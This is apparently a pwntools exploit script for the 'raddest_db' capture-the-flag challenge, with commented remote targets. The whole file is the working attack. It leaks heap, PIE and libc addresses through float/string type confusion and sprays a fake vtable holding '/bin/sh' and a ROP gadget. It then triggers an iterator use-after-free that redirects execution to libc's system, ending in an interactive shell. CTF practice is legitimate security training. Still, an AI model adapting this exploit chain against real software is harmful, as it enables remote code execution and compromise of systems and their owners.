from pwn import *
import decimal

context.bits = 64
context.terminal = ['tmux', 'split-window', '-h']
context.buffer_size = 4096

p = None

def go(aslr=False):
  global p

  p = process("./raddest_db", aslr=True, env={})
  if (not aslr):
    gdb.attach(p, gdbscript='''
      c
    ''')
  else:
    gdb.attach(p, gdbscript='''
      set follow-fork-mode child
      c
    ''')
  return

go(True)
#p = process("./raddest_db", aslr=True, env={})
#p = remote("172.17.0.2", 2301)
#p = remote("challenges.fbctf.com", 1337)

def clean():
    p.readuntil(">>>")
    p.readuntil(">>>")
    p.readuntil(">>>")

def double_to_u64(d64):
    return struct.unpack('Q', struct.pack("<d", d64))[0]

def u64_to_double(u):
    return struct.unpack("<d", struct.pack("Q", u))[0]


ctx = decimal.Context()
ctx.prec = 32
def float_to_str(d64):
    d1 = ctx.create_decimal(repr(d64))
    return format(d1, 'f')


def send_command(cmd):
    p.sendline(cmd)
    s = p.readuntil(">>> ")

    return s.split(b"\n")

def send_getter(cmd):
    p.sendline(cmd)
    s = p.readuntil("[getter]: ")

    return s.split(b"\n")

def heap_leaker():
    send_command("create leaker")
    send_command("store leaker float 1 1.1")
    send_command("store leaker string 1 aaaa")
    send_command("get leaker 1")

    f = float(p.readline())
    return f, double_to_u64(f)

def float_leak(addr):
    leak = arbitrary_leak(u64_to_double(addr))[:-1].ljust(8, '\0')
    return u64(leak)

def arbitrary_leak(addr):
    if isinstance(addr, float):
        send_command("create arb")
        send_command("store arb string 1 aaaa")
        send_command("store arb float 1 %s" % float_to_str(addr))
        send_command("get arb 1")
    elif isinstance(addr, int):
        send_command("create arb")
        send_command("store arb string 1 aaaa")
        send_command("store arb int 1 %s" % str(addr))
        send_command("get arb 1")
    else:
        assert(True)

    return p.readline('\n')

def invalidate_iterator(vtable):
    send_command("create test")
    send_command("create db")

    filler = 24
    all_killer = 512

    for i in xrange(filler):
        send_command("store db string %s %s" % (str(i), "A"*i))

    send_command("getter db %s %s" % (1, str(all_killer)))
    send_getter("empty")

    for i in xrange(1, all_killer):
        send_getter("store string 1 %s" % (p64(vtable)))
        print(i, all_killer)

    send_command("print db")

def leak_pie(heap_leak):
    ptr = float_leak(heap_leak + 0x140)
    pie = float_leak(ptr)
    return pie

def leak_libc(got_leak):
    libc_start_main = float_leak(got_leak)
    return libc_start_main 

def spray_heap(string, length=1024):
    if len(string) < length:
        string = string + (cyclic(length - len(string)))
    send_command("create spray")
    send_command("store spray string 1 %s" % (string))


clean()

ELF_OFFSET = 0x666e
GOT_OFFSET = 0x20afe0
LIBC_MAIN = 0x21ab0
DO_SYSTEM = 0x4f45b

_, heap_addr = heap_leaker()
pie_addr = leak_pie(heap_addr)
elf_base = pie_addr - ELF_OFFSET
libc_main_leak = leak_libc(elf_base + GOT_OFFSET)
libc_base = libc_main_leak - LIBC_MAIN

spray_addr = heap_addr + 0x1d5

print("HEAP LEAK: " + hex(heap_addr))
print("PIE LEAK: " + hex(pie_addr))
print("ELF BASE: " + hex(elf_base))
print("LIBC_MAIN ADDR: " + hex(libc_main_leak))
print("LIBC_BASE: " + hex(libc_base))
print("SPRAY LEAK: " + hex(spray_addr))

""" gadget.mp4 libc + 0x860d5
mov rdi, rbx
pop rbx
rax, qword [rax+0x130]
rax, qword [rax+0x20]
jmp rax
"""

rop_gadget = libc_base + 0x860d5
print("ROP: " + hex(rop_gadget))

raw_input("\n===attach debugger===\n")

vtable = spray_addr + 1 # add one to prevent a crash every 1/16 throws when the lsb is 0x20 (space)

payload = 'Q/bin/sh\0' + 'A' * 8 # [0:16]
payload += p64(vtable + 24) # [16:24]
payload += p64(vtable + 32) # [24:32]
payload += p64(rop_gadget) # [32:40]
payload += cyclic(cyclic_find("kaaa")) # [40:80]
payload += p64(vtable + 88) # [80:88]
payload += cyclic(0x20)
payload += p64(libc_base + DO_SYSTEM)

spray_heap(payload)
invalidate_iterator(vtable)

p.interactive()
